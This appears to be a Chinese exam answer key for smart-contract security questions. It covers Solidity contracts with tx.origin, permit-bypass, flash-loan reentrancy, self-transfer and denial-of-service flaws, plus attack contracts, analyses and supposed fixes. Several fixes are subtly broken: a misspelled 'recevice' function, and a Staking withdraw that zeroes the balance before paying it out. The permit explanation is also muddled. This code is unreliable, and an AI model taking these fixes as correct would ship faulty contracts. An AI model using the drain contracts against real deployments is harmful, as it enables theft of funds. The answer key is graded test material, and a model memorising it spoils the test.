创建新的智能合约，修复其中问题，说明修复内容并测试。（2分）\n\n参考答案：\n\n​\t如下为具体修改内容，主要修复点为将tx.origin改为msg.sender的体现方法。\n\n```javascript\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.11;\n\ncontract Wallet {\n    address public owner;\n\n    constructor() payable {\n        owner = msg.sender;\n    }\n\n    function transfer(address payable _to, uint _amount) public {\n        require(msg.sender == owner, \"Not owner\");\n        (bool sent, ) = _to.call{value: _amount}(\"\");\n        require(sent, \"Failed to send Ether\");\n    }\n}\n\ncontract Attack {\n    address payable public owner;\n    Wallet wallet;\n\n    constructor(Wallet _wallet) {\n        wallet = Wallet(_wallet);\n        owner = payable(msg.sender);\n    }\n\n    function attack() public {\n        wallet.transfer(owner, address(wallet).balance);\n    }\n}\n```\n\n​\t使用同样的测试用例进行操作，如下为测试用例：\n\n![img](https://blog-1304715799.cos.ap-nanjing.myqcloud.com/imgs/202310151624412.jpg) \n\n​\t如下为执行结果：\n\n![img](https://blog-1304715799.cos.ap-nanjing.myqcloud.com/imgs/202310151624408.jpg) \n\n \n\n## **Permit漏洞**\n\n### （2） 智能合约安全漏洞测试。（7分）\n\n有如下智能合约：\n\n```javascript\n//合约一：\npragma solidity ^0.8.11;\n\ncontract WETH9 {\n    string public name     = \"Wrapped Ether\";\n    string public symbol   = \"WETH\";\n    uint8  public decimals = 18;\n\n    event  Approval(address indexed src, address indexed guy, uint wad);\n    event  Transfer(address indexed src, address indexed dst, uint wad);\n    event  Deposit(address indexed dst, uint wad);\n    event  Withdrawal(address indexed src, uint wad);\n\n    mapping (address => uint)                       public  balanceOf;\n    mapping (address => mapping (address => uint))  public  allowance;\n\n\n    fallback() external { deposit(); }\n    function deposit() public payable {\n        balanceOf[msg.sender] += msg.value;\n      \n    }\n    function withdraw(uint wad) public {\n        require(balanceOf[msg.sender] >= wad);\n        balanceOf[msg.sender] -= wad;\n        payable(msg.sender).transfer(wad);\n       \n    }\n\n    function totalSupply() public view returns (uint) {\n        return address(this).balance;\n    }\n\n    function approve(address guy, uint wad) public returns (bool) {\n        allowance[msg.sender][guy] = wad;\n      \n        return true;\n    }\n\n    function transfer(address dst, uint wad) public returns (bool) {\n        return transferFrom(msg.sender, dst, wad);\n    }\n\n    function transferFrom(address src, address dst, uint wad)\n        public\n        returns (bool)\n    {\n        require(balanceOf[src] >= wad);\n\n        if (src != msg.sender && allowance[src][msg.sender] !=type(uint256).max) {\n            require(allowance[src][msg.sender] >= wad);\n            allowance[src][msg.sender] -= wad;\n        }\n\n        balanceOf[src] -= wad;\n        balanceOf[dst] += wad;\n\n     \n        return true;\n    }\n}\n//合约二：\n// SPDX-License-Identifier: UNLICENSED\n\npragma solidity 0.8.11;\nimport \"./WETH9.sol\";\n\ninterface ERC20 {\n    function transferFrom(address, address, uint) external;\n    function transfer(address, uint) external;\n    function balanceOf(address) external view returns (uint);\n    function permit(address,address,uint256,uint,uint,bytes32,bytes32) external;\n    function approve(address,address) external;\n}\n\ncontract Vault{\n    \n    constructor() {\n\n    }\n    function deposit(address token,uint256 amount) external{\n        ERC20(token).transferFrom(msg.sender,address(this),amount);\n    \n    }\n    \n    function depositwithPermit(address token,address target,uint256 vaule,uint deadline,uint v,bytes32 r, bytes32 s)external {\n        ERC20(token).permit(target,address(this),vaule,deadline,v,r,s);\n        ERC20(token).transferFrom(target,address(this),vaule);\n    }\n\n}\ncontract Setup {\n    WETH9 public weth9;\n    Vault public vault;\n    constructor() payable {\n        uint256 amount = msg.value;\n        weth9 = new WETH9();\n        weth9.deposit{value: amount}();\n        vault = new Vault();\n        weth9.approve(address(vault),type(uint256).max);\n        vault.deposit(address(weth9),amount/2);\n   \n    }\n    function withdraw(address token,address target,uint256 vaule,uint deadline,uint v,bytes32 r, bytes32 s) external {\n        vault.depositwithPermit(token, target, vaule, deadline, v, r, s);\n    }\n    function isSolved() external view returns (bool) {\n        uint256 balance = weth9.balanceOf(address(this));\n        return balance == 0;\n    }\n}\n```\n\n \n\n2.智能合约安全漏洞测试。（7分）\n\n（1）分析智能合约中存在问题，并说明危害。（2分）\n\n**参考答案：**\n\n`该合约为用户接收任何通证时触发fallback函数，导致没有执行permit授权验证漏洞。如果token通证没有permit授权验证但有fallback函数时，在调用permit通过签名消息来完成授权操作时不会报错,可以直接绕过permit()操作。当不通过permit进行授权时，可以随意的进行消息确认，从而导致账户资金不安全，此类问题常常存在与账户转账中金额设置中。`\n\n（2）根据truffle工具中的代码文件，编写测试用例，复现智能合约中存在的漏洞。（3分）\n\n**参考答案：**\n\n在migrations文件夹中加入代码部署的执行代码：\n\n![img](https://blog-1304715799.cos.ap-nanjing.myqcloud.com/imgs/202310151624418.jpg) \n\n具体测试用例编写内容如下：\n\n![img](https://blog-1304715799.cos.ap-nanjing.myqcloud.com/imgs/202310151624247.jpg) \n\n当测试用例执行成功即表示攻击成功，会有如下内容输出：\n\n![img](https://blog-1304715799.cos.ap-nanjing.myqcloud.com/imgs/202310151624270.jpg) \n\n（3）创建新的智能合约，修复其中问题，说明修复内容并测试。（2分）\n\n**参考答案：**\n\n可以使用receive函数来进行转账处理，来确保在通过token调用permit函数进行授权操作，如下为修改后的智能合约示例：\n\n```javascript\n//合约一：\npragma solidity ^0.8.11;\n\ncontract WETH9 {\n    string public name     = \"Wrapped Ether\";\n    string public symbol   = \"WETH\";\n    uint8  public decimals = 18;\n\n    event  Approval(address indexed src, address indexed guy, uint wad);\n    event  Transfer(address indexed src, address indexed dst, uint wad);\n    event  Deposit(address indexed dst, uint wad);\n    event  Withdrawal(address indexed src, uint wad);\n\n    mapping (address => uint)                       public  balanceOf;\n    mapping (address => mapping (address => uint))  public  allowance;\n\n\n    recevice() external payable{ deposit(); }\n    function deposit() public payable {\n        balanceOf[msg.sender] += msg.value;\n      \n    }\n    function withdraw(uint wad) public {\n        require(balanceOf[msg.sender] >= wad);\n        balanceOf[msg.sender] -= wad;\n        payable(msg.sender).transfer(wad);\n       \n    }\n\n    function totalSupply() public view returns (uint) {\n        return address(this).balance;\n    }\n\n    function approve(address guy, uint wad) public returns (bool) {\n        allowance[msg.sender][guy] = wad;\n      \n        return true;\n    }\n\n    function transfer(address dst, uint wad) public returns (bool) {\n        return transferFrom(msg.sender, dst, wad);\n    }\n\n    function transferFrom(address src, address dst, uint wad)\n        public\n        returns (bool)\n    {\n        require(balanceOf[src] >= wad);\n\n        if (src != msg.sender && allowance[src][msg.sender] !=type(uint256).max) {\n            require(allowance[src][msg.sender] >= wad);\n            allowance[src][msg.sender] -= wad;\n        }\n\n        balanceOf[src] -= wad;\n        balanceOf[dst] += wad;\n\n     \n        return true;\n    }\n}\n//合约二：\n// SPDX-License-Identifier: UNLICENSED\n\npragma solidity 0.8.11;\nimport \"./WETH9.sol\";\n\ninterface ERC20 {\n    function transferFrom(address, address, uint) external;\n    function transfer(address, uint) external;\n    function balanceOf(address) external view returns (uint);\n    function permit(address,address,uint256,uint,uint,bytes32,bytes32) external;\n    function approve(address,address) external;\n}\n\n\ncontract Vault{\n    \n    constructor() {\n\n    }\n    function deposit(address token,uint256 amount) external{\n        ERC20(token).transferFrom(msg.sender,address(this),amount);\n    \n    }\n    \n    function depositwithPermit(address token,address target,uint256 vaule,uint deadline,uint v,bytes32 r, bytes32 s)external {\n        ERC20(token).permit(target,address(this),vaule,deadline,v,r,s);\n        ERC20(token).transferFrom(target,address(this),vaule);\n    }\n\n}\ncontract Setup {\n    WETH9 public weth9;\n    Vault public vault;\n    constructor() payable {\n        uint256 amount = msg.value;\n        weth9 = new WETH9();\n        weth9.deposit{value: amount}();\n        vault = new Vault();\n        weth9.approve(address(vault),type(uint256).max);\n        vault.deposit(address(weth9),amount/2);\n   \n    }\n    function withdraw(address token,address target,uint256 vaule,uint deadline,uint v,bytes32 r, bytes32 s) external {\n        vault.depositwithPermit(token, target, vaule, deadline, v, r, s);\n    }\n    function isSolved() external view returns (bool) {\n        uint256 balance = weth9.balanceOf(address(this));\n        return balance == 0;\n    }\n}\n```\n\n如上代码中通过将fallback函数替换为receive函数，从而规避了接收以太币触发fallback函数的操作。\n\n使用同样的测试用例，再执行，验证测试攻击是否仍能成功，如下为验证正确性的测试方法：\n\n![img](https://blog-1304715799.cos.ap-nanjing.myqcloud.com/imgs/202310151624289.jpg) \n\n当有交易被回滚，说明修复成功：\n\n![img](https://blog-1304715799.cos.ap-nanjing.myqcloud.com/imgs/202310151624308.jpg)\n\n \n\n## **CTF-3漏洞**\n\n### （3）智能合约安全漏洞测试。（4分）\n\n有如下问题智能合约：\n\n```javascript\npragma solidity ^0.8.11;\n\nimport \"./Setup.sol\";\n\ncontract Attacker is IUSDTHolder{\n    USDT public usdt;\n    Setup public setup;\n    Staking public staking;\n\n    constructor(Setup _setup){\n        setup = _setup;\n        usdt = setup.usdt();\n        staking = setup.staking();\n    }\n\n    function attack() external {\n        usdt.flashLoan(\n            0,\n            address(usdt),\n            abi.encodeWithSignature(\"approve(address,uint256)\", address(this), type(uint256).max)\n            );\n        usdt.transferFrom(address(usdt), address(this), usdt.balanceOf(address(usdt)));\n\n        usdt.approve(address(staking), type(uint256).max);\n        staking.deposit(usdt.balanceOf(address(staking)));\n        staking.withdraw();\n    }\n\n    function onReceived(address from, uint256 amount) external{\n        from; amount;\n        if(usdt.balanceOf(address(staking)) > 0 && from == address(staking)){\n            staking.withdraw();\n        }\n    }\n}\n```\n\n(1) 分析智能合约中存在问题，并说明危害。（1分）\n\n**参考答案：**\n\n`该合约存在漏洞是重入漏洞和任意的calldata作为参数，分别在Staking和USDT中。`\n\n（2）根据truffle工具中的代码文件，编写测试用例，复现智能合约中存在的漏洞。（1分）\n\n**参考答案：**\n\n![img](https://blog-1304715799.cos.ap-nanjing.myqcloud.com/imgs/202310151624605.jpg) \n\n \n\n**执行：truffle test**\n\n![img](https://blog-1304715799.cos.ap-nanjing.myqcloud.com/imgs/202310151624952.jpg) \n\n（3）创建新的智能合约，修复其中问题，说明修复内容并测试。（2分）\n\n参考答案：\n\n如下为修复后USDT智能合约的具体内容：\n\n```javascript\ninterface IUSDTHolder {\n    function onReceived(address from, uint256 amount) external;\n}\ninterface IUSDTFlashLoanCall {\n    function USDTFlashLoan(uint256 amount, bytes calldata data) external returns(bool);\n}\ncontract USDT is ERC20, ReentrancyGuard {\n    constructor(uint256 total) ERC20(\"USDT\", \"USDT\"){\n        _mint(msg.sender, total);\n        _mint(address(this), total);\n    }\n\n    function _afterTokenTransfer(\n        address from,\n        address to,\n        uint256 amount\n    ) internal override  {\n        from;\n        amount;\n        if(isContract(to)){\n            IUSDTHolder(to).onReceived(from, amount);\n        }\n    }\n\n    function isContract(address account) internal view returns (bool) {\n        // This method relies on extcodesize/address.code.length, which returns 0\n        // for contracts in construction, since the code is only stored at the end\n        // of the constructor execution.\n\n        return account.code.length > 0;\n    }\n\n    function flashLoan(\n        uint256 amount,\n        address receiver,\n        bytes calldata data\n    )\n        external\n        nonReentrant\n    {\n        uint256 balanceBefore = balanceOf(address(this));\n        require(amount <= balanceBefore, \"Not enough\");\n\n        _transfer(address(this), receiver, amount);\n        \n        bool success= IUSDTFlashLoanCall(receiver).USDTFlashLoan(amount, data);\n        require(success, \"Contract call failed\");\n\n        uint256 newBalance = balanceOf(address(this));\n        require(newBalance >= balanceBefore, \"Flash loan fail\");\n    }\n}\n```\n\n如下为修复后Staking智能合约的具体内容：\n\n```javascript\ncontract Staking is IUSDTHolder{\n    mapping(address => uint) public balances;\n\n    USDT public immutable usdt;\n\n    constructor(USDT _usdt) {\n        usdt = _usdt;\n    }\n\n    function deposit(uint256 amount) external {\n        usdt.transferFrom(msg.sender, address(this), amount);\n        balances[msg.sender] += amount;\n    }\n\n    function withdraw() external{\n        require(balances[msg.sender] >= 0, \"Insufficient balance\");\n        balances[msg.sender] = 0;\n        require(usdt.transfer(msg.sender, balances[msg.sender]), \"Failed\");\n    }\n\n    function getBalance() public view returns (uint256) {\n        return usdt.balanceOf(address(this));\n    }\n\n    function onReceived(address from, uint256 amount) external override {}\n\n}\n```\n\n \n\n**执行命令：truffle test**\n\n**出现交易回滚则说明修复成功。**\n\n![img](https://blog-1304715799.cos.ap-nanjing.myqcloud.com/imgs/202310151624915.jpg) \n\n \n\n## **CTF-1漏洞**\n\n### （4）智能合约安全漏洞测试。（7分）\n\n有如下问题智能合约：\n\n```javascript\n// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.10;\n\ninterface ERC20 {\n}\n\ninterface WETH is ERC20 {\n    function deposit() external payable;\n}\n\ncontract Setup {\n    \n    WETH public constant weth = WETH(0xdbf610b81A2E86f0Cf16E2DA596A9B277423d244);\n    mapping(address => uint256) balances;\n\n    constructor() payable {\n        require(msg.value >= 1e19);\n        balances[address(this)] = 1e19;\n    }\n\n    function transfer(address from, address to, uint256 amt) public{\n        uint256 balance_from = balances[from];\n        uint256 balance_to = balances[to];\n        balances[from] = balance_from - amt;\n        balances[to] = balance_to + amt;\n    }\n    \n    function isSolved() external view returns (bool) {\n        return balances[address(this)] > 1e19;\n    }\n}\n```\n\n(1)分析智能合约中存在问题，并说明危害。（1分）\n\n**参考答案：**\n\n`该智能合约中from 和to的地址一致时调用transfer函数,from的账户余额不减反增，使用此智能合约将无法保证资金账户的安全。`\n\n(2)根据truffle工具中的代码文件，编写测试用例，复现智能合约中存在的漏洞。（2分）\n\n**参考答案：**\n\n![img](https://blog-1304715799.cos.ap-nanjing.myqcloud.com/imgs/202310151624206.jpg) \n\n当测试用例执行成功即表示攻击成功，会有如下内容输出：\n\n \n\n![img](https://blog-1304715799.cos.ap-nanjing.myqcloud.com/imgs/202310151624353.jpg) \n\n(3)创建新的合约修复问题，说明修复内容并测试其智能合约。（4分）\n\n在合约中在进行转账之前判断from和to账户地址是否相同，可以有效帮助合约规避由于合约地址相同带来的风险。\n\n**参考答案：**\n\n```javascript\n// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.11;\n\ninterface ERC20 {\n}\n\ninterface WETH is ERC20 {\n    function deposit() external payable;\n}\n\ncontract Setup {\n    \n    WETH public constant weth = WETH(0xEE465A06ca8039fB11276B5Eab6c43C3758929d4);\n    mapping(address => uint256) balances;\n\n    constructor() payable {\n        require(msg.value >= 1e19);\n        balances[address(this)] = 1e19;\n    }\n\n    function transfer(address from, address to, uint256 amt) public{\n        uint256 balance_from = balances[from];\n        uint256 balance_to = balances[to];\n        require(from != to,\"Addr Equal\");\n        balances[from] = balance_from - amt;\n        balances[to] = balance_to + amt;\n    }\n    \n    function isSolved() external view returns (bool) {\n        return balances[address(this)] > 1e19;\n    }\n}\n```\n\n 直接执行命令：truffle test\n\n![img](https://blog-1304715799.cos.ap-nanjing.myqcloud.com/imgs/202310151624682.jpg) \n\n \n\n## **CTF-2漏洞**\n\n### （5）智能合约安全漏洞测试。（4分）\n\n有如下问题智能合约：\n\n```javascript\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.11;\n\ncontract KingOfEther {\n    address public king;\n    uint public balance;\n\n    function claimThrone() external payable {\n        require(msg.value > balance, \"Need to pay more to become the king\");\n\n        (bool sent, ) = king.call{value: balance}(\"\");\n        require(sent, \"Failed to send Ether\");\n\n        balance = msg.value;\n        king = msg.sender;\n    }\n}\n\ncontract Attack{\n    KingOfEther kingOfEther;\n\n    constructor(KingOfEther _kingOfEther) {\n        kingOfEther = KingOfEther(_kingOfEther);\n    }\n\n    function attack() public payable {\n        kingOfEther.claimThrone{value: msg.value}();\n    }\n}\n```\n\n分析智能合约中存在问题，并说明危害。（1分）\n\n**参考答案：**\n\n`这个是智能合约中比较典型的漏洞，即为拒绝服务攻击。msg.sender可以通过claimThrone传入以太，当传入的以太数值高于balance的时候，这个msg.sender就成为了king，而且在成为king之前，要把之前king传入的以太返还回去，但是返回以太的代码不一定成功执行，一旦无法成功执行，就阻塞在这里了。这样任何新地址都可能无法成为King，整个合约就是拒绝服务的状态。`\n\n根据truffle工具中的代码文件，编写测试用例，复现智能合约中存在的漏洞。（1分）\n\n**参考答案：**\n\n在migrations文件夹中加入代码部署的执行代码：\n\n![img](https://blog-1304715799.cos.ap-nanjing.myqcloud.com/imgs/202310151624134.jpg) \n\n具体测试用例编写内容如下：\n\n![img](https://blog-1304715799.cos.ap-nanjing.myqcloud.com/imgs/202310151624372.jpg) \n\n当测试用例执行成功即表示攻击成功，会有如下内容输出：\n\n![img](https://blog-1304715799.cos.ap-nanjing.myqcloud.com/imgs/202310151624628.jpg) \n\nl 创建新的智能合约，修复其中问题，说明修复内容并测试。（2分）\n\n参考答案：\n\n如下为具体修改内容，合约中不要主动给地址发通证，可以自己设置一个withdraw方法，由用户自己进行提款。\n\n，如下为修改后的智能合约示例：\n\n```javascript\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.11;\n\ncontract KingOfEther {\n    address public king;\n    uint public balance;\n    mapping(address => uint) public balances;\n    function claimThrone() external payable {\n        require(msg.value > balance, \"Need to pay more to become the king\");\n        balances[king] += balance;\n        balance = msg.value;\n        king = msg.sender;\n    }\n    function withdraw() public {\n        require(msg.sender != king, \"Current king cannot withdraw\");\n        uint amount = balances[msg.sender];\n        balances[msg.sender] = 0;\n        (bool sent, ) = msg.sender.call{value: amount}(\"\");\n        require(sent, \"Failed to send Ether\");\n    }\n}\n\ncontract Attack{\n    KingOfEther kingOfEther;\n\n    constructor(KingOfEther _kingOfEther) {\n        kingOfEther = KingOfEther(_kingOfEther);\n    }\n\n    function attack() public payable {\n        kingOfEther.claimThrone{value: msg.value}();\n    }\n}\n```\n\n​\t在如上代码中通过定义自定义withdraw方法，由用户自己进行提款。\n\n​\t使用同样的测试用例，再执行，验证测试攻击是否仍能成功，如下为验证正确性的测试方法：\n\n![img](https://blog-1304715799.cos.ap-nanjing.myqcloud.com/imgs/202310151624902.jpg) \n\n当有交易被回滚，说明修复成功：\n\n![img](https://blog-1304715799.cos.ap-nanjing.myqcloud.com/imgs/202310151624943.jpg) \n\n "}
